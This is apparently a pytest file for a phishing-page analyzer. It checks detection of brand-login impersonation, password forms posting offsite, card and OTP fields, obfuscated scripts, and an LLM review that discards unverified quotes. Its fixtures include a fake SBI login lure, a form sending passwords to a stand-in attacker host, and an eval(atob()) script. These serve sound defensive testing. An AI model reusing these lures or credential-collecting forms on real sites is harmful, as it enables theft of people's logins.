"""Page-content analysis (part of the website check)."""
import asyncio

from app.analyzers import content_analyzer as ca

FAKE_SBI = """<html><head><title>SBI Online - Login</title></head><body>
<h1>Your account will be blocked today</h1>
<form action="/login" method="post"><input name="username"><input type="password" name="pwd"></form>
</body></html>"""


def ids(findings):
    return {f.id for f in findings}


def test_brand_login_on_a_domain_the_brand_does_not_own():
    f, data, text, worth = ca.inspect_html("https://sbi-kyc-update.example/login", FAKE_SBI)
    assert "content.brand_login" in ids(f)
    assert next(x for x in f if x.id == "content.brand_login").severity.value == "high"
    assert data["brand_in_title"] == "State Bank of India" and data["password_field"] is True
    assert worth and "blocked today" in text


def test_brand_login_on_its_own_domain_is_fine():
    f, *_ = ca.inspect_html("https://onlinesbi.sbi/", FAKE_SBI)
    assert "content.brand_login" not in ids(f)


def test_sign_in_with_google_in_the_body_is_not_impersonation():
    html = """<title>Sign in to GitHub</title><form action="/session"><input type="password" name="password"></form>
    <p>Continue with Google</p>"""
    f, data, *_ = ca.inspect_html("https://github.com/login", html)
    assert f == [] and data["brand_in_title"] is None


def test_password_form_posting_to_another_site():
    html = '<title>Login</title><form action="https://collect.evil.example/p.php"><input type="password" name="p"></form>'
    f, data, *_ = ca.inspect_html("https://innocent-looking.example/", html)
    assert "content.password_form_offsite" in ids(f)
    assert data["offsite_form_targets"] == ["collect.evil.example"]


def test_newsletter_form_to_a_mail_service_is_not_flagged():
    html = '<title>Blog</title><form action="https://list-manage.example.com/subscribe"><input type="email" name="EMAIL"></form>'
    f, _, _, worth = ca.inspect_html("https://someblog.example/", html)
    assert f == [] and worth is True  # offsite form noted (AI may look) but no finding by itself


def test_card_and_otp_fields():
    html = '<title>Refund</title><form><input name="card_number"><input name="cvv"><input name="otp"></form>'
    f, data, *_ = ca.inspect_html("https://refund-help.example/", html)
    finding = next(x for x in f if x.id == "content.sensitive_fields")
    assert {"card number", "CVV", "OTP"} <= set(data["sensitive_fields"])
    assert finding.severity.value == "low"  # on its own; higher only with a brand or an offsite form


def test_pin_code_address_field_is_not_a_secret():
    html = '<form><input name="pincode" placeholder="PIN code"><input name="city"></form>'
    f, data, *_ = ca.inspect_html("https://shop.example/", html)
    assert data["sensitive_fields"] == [] and f == []


def test_obfuscated_script():
    html = "<title>x</title><script>eval(atob('YWxlcnQoMSk='))</script>"
    f, *_ = ca.inspect_html("https://x.example/", html)
    assert "content.obfuscated_script" in ids(f)


def test_scripts_are_never_page_text():
    f, data, text, worth = ca.inspect_html("https://x.example/", "<title>t</title><script>var secret=1</script><p>Hello</p>")
    assert "secret" not in text and "Hello" in text


def test_ai_review_keeps_only_verified_quotes(monkeypatch):
    monkeypatch.setattr(ca, "llm_available", lambda: True)

    async def fake_llm(system, user, schema):
        assert "<untrusted" in user  # the page is fenced as untrusted data
        return schema(tactics=[
            {"tactic": "Threat of account block", "quote": "Your account will be blocked today"},
            {"tactic": "Invented", "quote": "Send us your Aadhaar now"},  # not on the page: must be dropped
        ])

    monkeypatch.setattr(ca, "llm_json", fake_llm)
    text = "Your account will be blocked today. Please log in."
    out = asyncio.run(ca.ai_review("https://x.example/", text))
    assert len(out) == 1 and out[0].severity.value == "medium"
    assert "blocked today" in out[0].evidence and "verified" in out[0].source


def test_ai_review_off_without_a_key():
    assert asyncio.run(ca.ai_review("https://x.example/", "anything")) == []
